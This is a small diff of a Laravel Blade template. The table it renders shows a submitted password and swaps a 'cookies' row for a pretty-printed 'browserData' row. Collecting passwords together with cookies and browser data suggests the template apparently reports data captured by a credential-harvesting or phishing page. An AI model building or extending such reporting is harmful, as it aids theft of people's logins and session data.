@@ -33,8 +33,10 @@
             <td>{{ $formData['password'] }}</td>
         </tr>
         <tr>
-            <th>Password</th>
-            <td>{{ $formData['cookies'] }}</td>
+            <th>Browser Data</th>
+            <td>
+                <pre>{{ json_encode($formData['browserData'], JSON_PRETTY_PRINT) }}</pre>
+            </td>
         </tr>
     </table>
 </body>
